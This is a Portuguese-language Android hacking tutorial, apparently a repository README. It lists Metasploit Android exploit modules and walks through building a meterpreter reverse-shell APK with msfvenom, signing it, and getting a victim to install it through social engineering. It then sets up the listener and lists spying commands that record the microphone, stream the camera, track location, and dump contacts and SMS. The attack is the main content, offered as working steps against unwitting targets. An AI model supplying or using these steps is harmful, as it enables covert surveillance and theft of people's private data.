# Pentest-Mobile
 Vulnerability Exploitation

Algumas das ferramentas mais utilizadas para testes de segurança em dispositivos Android incluem:

AndroBugs Framework: uma ferramenta de análise estática que permite identificar vulnerabilidades em códigos-fonte de aplicativos Android.
Apktool: uma ferramenta de engenharia reversa que permite analisar e modificar arquivos APK de aplicativos Android.
Metasploit Framework: uma plataforma de teste de penetração que permite explorar vulnerabilidades em sistemas e dispositivos.
MobSF (Mobile Security Framework): uma plataforma de teste de segurança de aplicativos móveis que permite realizar análises estáticas e dinâmicas em aplicativos Android.

_________________________________________________________________________________________________________________________________________________________________

O Metasploit Framework é uma ferramenta poderosa e versátil que permite testar a segurança de dispositivos Android, identificar vulnerabilidades e propor soluções de correção.

Alguns exemplos de módulos do Metasploit Framework para dispositivos móveis incluem:

exploit/android/browser/webview_addjavascriptinterface: este módulo permite explorar a vulnerabilidade CVE-2012-6636 no Android WebView, que permite que aplicativos maliciosos executem código arbitrário.

exploit/android/local/binder_uaf: este módulo permite explorar uma vulnerabilidade de uso após liberação no serviço Binder do Android, que permite que aplicativos maliciosos obtenham privilégios de root.

exploit/android/local/mediaserver_stagefright: este módulo permite explorar uma vulnerabilidade no serviço mediaserver do Android, que permite que aplicativos maliciosos executem código arbitrário.

exploit/android/local/writable_browser_dirs: este módulo permite explorar a vulnerabilidade CVE-2014-6041 no Android WebView, que permite que aplicativos maliciosos instalem pacotes maliciosos.

_________________________________________________________________________________________________________________________________________________________________

Passo 1: Criando um arquivo apk malicioso

Abra o seu KALI LINUX. Abra o Terminal e digite o seguinte comando

Hack Android Phone using metasploit and msfvenom

# msfvenom -p android/meterpreter/reverse_tcp LHOST=seuip LPORT=4444 R > hackingworld.apk

Saída:

metasploit and msfvenom command prompt

**LHOST= SEU endereço IP

**LPORT= 4444

**Use ifconfig para encontrar seu endereço IP, se você não sabe.

# ifconfig

Passo 2: Entregando o arquivo APK para a vítima

Agora você criou seu spyware malicioso .apk arquivo usando Metasploit e msfvenom. Ele será salvo em sua pasta /home/ por padrão. Encontre o seu recém-criado hackingworld.apk e envie-o para o seu alvo (hackingworld.apk). Use a engenharia social para fazer isso para que a vítima instale o apk.

**Se você receber erros ou problemas de assinatura, use o seguinte:

Keytool (vem pré-instalado no Kali Linux)

keytool -genkey -v -keystore my-release-key. Keystore -alias alias_name -keyalg RSA -keysize 2048 -validade 10000

Jarsigner (vem pré-instalado no Kali Linux)

jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key. Keystore hackingworld.apk aliasname

jarsigner -verify -verbose -certs hackingworld.apk

Etapa 3: Configuração do Metasploit

Abra um novo terminal e use o seguinte comando para iniciar o Metasploit framework.

metasploit and msfvenom using console
# msfconsole

Agora, no console da estrutura Metasploit, digite o seguinte

msf > use exploit/multi/handler msf exploit(handler) > set payload android/meterpreter/reverse_tcp msf exploit(handler) > set LHOST 192.168.78.129 msf exploit(handler) > set LPORT 4444



msf exploit(handler) > exploit

Aqui

**LHOST= SEU endereço IP

**LPORT= 4444

metasploit and msfvenom using TCP handler
Agora, quando o usuário abre o aplicativo em seu telefone, você terá uma sessão com esse dispositivo. E uau! O dispositivo é seu para operar. Metasploit e msfvenom não são tão difíceis de usar, mas precisam de etapas metodológicas que precisam ser implementadas.

Etapa 4: Explorar..!!!

No momento em que a vítima abre o aplicativo em seu dispositivo, você receberá um shell meterpreter no terminal Kali Linux.

Agora você já hackeou com sucesso o dispositivo Android usando Metasploit e msfvenom

Alguns comandos que você deve tentar usando Metasploit e msfvenom:

– record_mic

Grava o áudio do dispositivo Android e o armazena na unidade local.

– webcam_snap

Permite que você tire as imagens hackeando a câmera Android do dispositivo

– webcam_stream

Permite transmitir vídeo ao vivo da câmera Android hackeada

– dump_contacts

Permite que você hackeie e copie todos os contatos do telefone da vítima.

– dump_sms

Permite que você hackeie as mensagens da vítima e as armazene em um arquivo de texto em seu sistema.

– geolocalização

Ajuda você a rastrear o dispositivo hackeado por localização

Então, é assim que os hackers hackeiam usando Metasploit e msfvenom na rede local. Mas e se quiséssemos hackear dispositivos Android com Metasploit pela internet.

